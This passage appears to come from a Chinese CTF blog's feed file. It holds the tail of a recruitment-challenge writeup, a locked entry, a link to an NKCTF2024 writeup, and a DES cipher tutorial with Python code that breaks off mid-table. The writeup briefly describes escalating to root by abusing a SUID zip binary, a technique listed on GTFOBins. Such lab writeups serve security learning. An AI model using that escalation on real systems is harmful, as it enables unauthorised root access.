/><figcaption aria-hidden="true">屏幕截图 2024-04-02 180909</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181031310.png"alt="image-20240402181031310" /><figcaption aria-hidden="true">image-20240402181031310</figcaption></figure><p>可以看到现在的用户是ctf，但是flag在/root/flag.txt下，需要提权</p><p>这里用suid提权，先看一下哪些文件有suid权限</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181207616.png"alt="image-20240402181207616" /><figcaption aria-hidden="true">image-20240402181207616</figcaption></figure><p>在<ahref="https://gtfobins.github.io/gtfobins/zip/">gtfobins</a>上面查到可以利用/usr/bin/zip提权读取文件，以此得到第二个flag</p><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181337524.png"alt="image-20240402181337524" /><figcaption aria-hidden="true">image-20240402181337524</figcaption></figure><figure><imgsrc="/images/X1ct34m-2024-Misc-招新题-CrazyC2/image-20240402181431988.png"alt="image-20240402181431988" /><figcaption aria-hidden="true">image-20240402181431988</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>X1ct34m 2024 Misc 招新题 Wrong Direction!（需要密码）</title>
      <link href="/2024/03/28/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/"/>
      <url>/2024/03/28/X1ct34m-2024-Misc-%E6%8B%9B%E6%96%B0%E9%A2%98-Wrong-Direction!/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Sorry, wrong password, try again." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dc396f3978c54eca9842fea1611b84d548ac131ef2fb197a87e914ba6dff1a34"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Plz enter the password.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2024 Writeup</title>
      <link href="/2024/03/24/NKCTF2024-Writeup/"/>
      <url>/2024/03/24/NKCTF2024-Writeup/</url>
      
        <content type="html"><![CDATA[<h4 id="writeup"><ahref="https://www.blog.st4rr.top/writeups/NKCTF2024Writeup.pdf">Writeup</a></h4>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> NKCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/2024/03/20/DES%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/03/20/DES%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<p>参考了<ahref="https://blog.csdn.net/weixin_52553215/article/details/124215865">这篇文章</a></p><h2 id="简述">简述</h2><p>DES（Data EncryptionStandard）是一种对称加密算法，它将64位的明文分成64位的块，并使用64位的密钥来进行加密操作。虽然DES本身只能处理64位的数据块，但是可以通过分组密码模式（如ECB、CBC、CFB、OFB、CTR等）来加密更长的数据。</p><h2 id="初始置换">初始置换</h2><p>输入明文M（64位），根据下表进行初始置换，得到IP</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">60,52,44,36,28,20,12,4,</span><br><span class="line">62,54,46,38,30,22,14,6,</span><br><span class="line">64,56,48,40,32,24,16,8,</span><br><span class="line">57,49,41,33,25,17, 9,1,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">61,53,45,37,29,21,13,5,</span><br><span class="line">63,55,47,39,31,23,15,7,</span><br></pre></td></tr></table></figure><p>如将M的第58位填入IP的第一位。</p><p>然后将IP平分为两段，L0和R0</p><h2 id="生成子密钥">生成子密钥</h2><p>一图以概之</p><p><img src="/images/DES加密/4433f1aedb9f4df98c7cbb7a783a7bda.png" alt="4433f1aedb9f4df98c7cbb7a783a7bda" style="zoom: 80%;" /></p><p>首先，一开始输入的64位key按照下表进行转换，生成56位密钥（置换选择1）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">57,49,41,33,25,17,9,1,</span><br><span class="line">58,50,42,34,26,18,10,2,</span><br><span class="line">59,51,43,35,27,19,11,3,</span><br><span class="line">60,52,44,36,63,55,47,39,</span><br><span class="line">31,23,15,7,62,54,46,38,</span><br><span class="line">30,22,14,6,61,53,45,37,</span><br><span class="line">29,21,13,5,28,20,12,4</span><br></pre></td></tr></table></figure><p>实际上，这里只从原始密钥中取了56位进行变换，原始密钥中每字节的最高位是没有被使用的。</p><p>得到子密钥（56位）后，将变换后的子密钥分成两部分，C0和D0</p><p>得到C0和D0后，分别进行循环左移位操作，得到C1<sub>C16和D1</sub>D16的值，每一次循环移位的位数如下：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1,1,2,2,2,2,2,2,1,2,2,2,2,2,2,1</span><br></pre></td></tr></table></figure><p>如C0=1111000011001100101010101111</p><p>C1=1110000110011001010101011111</p><p>C2=1100001100110010101010111111</p><p>将每组Cn和Dn组合起来，得到十六组数据再次按照下表进行替换，得到K1~K16（置换选择2）</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">14,17,11,24,1,5,</span><br><span class="line">3,28,15,6,21,10,</span><br><span class="line">23,19,12,4,26,8,</span><br><span class="line">16,7,27,20,13,2,</span><br><span class="line">41,52,31,37,47,55,</span><br><span class="line">30,40,51,45,33,48,</span><br><span class="line">44,49,39,56,34,53,</span><br><span class="line">46,42,50,36,29,32</span><br></pre></td></tr></table></figure><h2 id="轮函数">轮函数</h2><p>对上面初始置换中得到的L0和R0，我们在这里进行16轮加密变换，下面的图<del>（嫖来的）</del>描述了这个流程，其中函数f后面会叙述</p><figure><img src="/images/DES加密/2e1e54d0330a4d21a4aeada39bd0ca72.png"alt="2e1e54d0330a4d21a4aeada39bd0ca72" /><figcaptionaria-hidden="true">2e1e54d0330a4d21a4aeada39bd0ca72</figcaption></figure><p>由图知，L0通过与f函数运算后的结果进行异或后成为了R1，R0直接用作L1</p><p>下面是对f函数实现过程的具体描述</p><figure><img src="/images/DES加密/01d6b86ae2844e53b304002dc3c36db2.png"alt="01d6b86ae2844e53b304002dc3c36db2" /><figcaptionaria-hidden="true">01d6b86ae2844e53b304002dc3c36db2</figcaption></figure><h3 id="扩充置换">扩充/置换：</h3><p>此处的32位Rn先进行扩充置换变成了48位（因为我们需要将其与48位的子密钥异或）。</p><h3 id="与密钥异或">与密钥异或</h3><p>在扩充后，与之前生成的对应轮数的子密钥Kn进行异或运算</p><h3 id="代换选择">代换/选择</h3><p>将48位的数据转换为32位。这一步是整个DES算法的核心，简称S盒。</p><h4 id="s盒">S盒</h4><figure><img src="/images/DES加密/e6cccba809c648ad96d79f2119b1d083.png"alt="e6cccba809c648ad96d79f2119b1d083" /><figcaptionaria-hidden="true">e6cccba809c648ad96d79f2119b1d083</figcaption></figure><p>对于每个S盒，对照着4行16列的表，6比特输入中的第1比特和第6比特组成的二进制数来确定行，中间4位二进制数来确定列，对应行、列位置的十进制数的4位二进制数表示作为输出。</p><h3 id="置换">置换</h3><p>经过置换表进行置换</p><h3 id="异或">异或</h3><p>与对应环节的Ln进行异或</p><h2 id="交换">交换</h2><p>将L16和R16位置交换</p><h2 id="逆初始置换">逆初始置换</h2><p><strong>这里的置换方式与前面的不一样！</strong></p><p>这里的方式与前面的都恰好相反。</p><p>例如：</p><p>原始数据的第1位置换到了第40位，第2位置换到了第8位。则逆置换就是将第40位置换到第1位，第8位置换到第2位。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">40,8,48,16,56,24,64,32,</span><br><span class="line">39,7,47,15,55,23,63,31,</span><br><span class="line">38,6,46,14,54,22,62,30,</span><br><span class="line">37,5,45,13,53,21,61,29,</span><br><span class="line">36,4,44,12,52,20,60,28,</span><br><span class="line">35,3,43,11,51,19,59,27,</span><br><span class="line">34,2,42,10,50,18,58,26,</span><br><span class="line">33,1,41,9,49,17,57,25</span><br></pre></td></tr></table></figure><p>至此可以得到密文C</p><h2 id="代码实现">代码实现</h2><p>参考了<ahref="https://blog.csdn.net/weixin_44034444/article/details/121055630">这篇文章</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ArrangeSimpleDES</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 出初始化DES加密的参数</span></span><br><span class="line">        self.ip = [</span><br><span class="line">            <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">            <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>,</span><br><span class="line">        ]  <span class="comment"># ip置换</span></span><br><span class="line"> </span><br><span class="line">        self.ip1 = [</span><br><span class="line">            <span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">            <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># 逆ip置换</span></span><br><span class="line">        self.E = [</span><br><span class="line">            <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>,</span><br><span class="line">            <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line">            <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">            <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">            <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>,</span><br><span class="line">        ]  <span class="comment"># E置换，将32位明文置换位48位</span></span><br><span class="line">        self.P = [</span><br><span class="line">            <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">            <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>,</span><br><span class="line">        ]  <span class="comment"># P置换，对经过S盒之后的数据再次进行置换</span></span><br><span class="line">        <span class="comment"># 设置默认密钥</span></span><br><span class="line">        self.K = <span class="string">&#x27;0111010001101000011010010111001101101001011100110110100101110110&#x27;</span></span><br><span class="line">        self.k1 = [</span><br><span class="line">            <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">            <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>,</span><br><span class="line">            <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">            <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,</span><br><span class="line">            <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">            <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>,</span><br><span class="line">            <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        ]  <span class="comment"># 密钥的K1初始置换</span></span><br><span class="line">        self.k2 = [</span><br><span class="line">            <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">            <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">            <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">            <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">            <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>,</span><br><span class="line">        ]</span><br><span class="line"> </span><br><span class="line">        self.k0 = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, ]  <span class="comment"># 秘钥循环移位的位数</span></span><br><span class="line"> </span><br><span class="line">        self.S = [</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xe</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0xb</span>, <span class="number">0x8</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0x5</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x7</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xf</span>, <span class="number">0x7</span>, <span class="number">0x4</span>, <span class="number">0xe</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0xc</span>, <span class="number">0xb</span>, <span class="number">0x9</span>, <span class="number">0x5</span>, <span class="number">0x3</span>, <span class="number">0x8</span>,</span><br><span class="line">                <span class="number">0x4</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0xd</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x3</span>, <span class="number">0xa</span>, <span class="number">0x5</span>, <span class="number">0x0</span>,</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0xc</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x5</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0xe</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x6</span>, <span class="number">0xd</span>,</span><br><span class="line">            ],</span><br><span class="line">            [</span><br><span class="line">                <span class="number">0xf</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0x6</span>, <span class="number">0xb</span>, <span class="number">0x3</span>, <span class="number">0x4</span>, <span class="number">0x9</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa</span>,</span><br><span class="line">                <span class="number">0x3</span>, <span class="number">0xd</span>, <span class="number">0x4</span>, <span class="number">0x7</span>, <span class="number">0xf</span>, <span class="number">0x2</span>, <span class="number">0x8</span>, <span class="number">0xe</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0xb</span>, <span class="number">0x5</span>,</span><br><span class="line">                <span class="number">0x0</span>, <span class="number">0xe</span>, <span class="number">0x7</span>, <span class="number">0xb</span>, <span class="number">0xa</span>, <span class="number">0x4</span>, <span class="number">0xd</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x8</span>, <span class="number">0xc</span>, <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0xf</span>,</span><br><span class="line">                <span class="number">0xd</span>, <span class="number">0x8</span>, <span class="number">0xa</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0xf</span>, <span class="number">0x4</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x6</span>, <span class="number">0x7</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xe</span>, <span 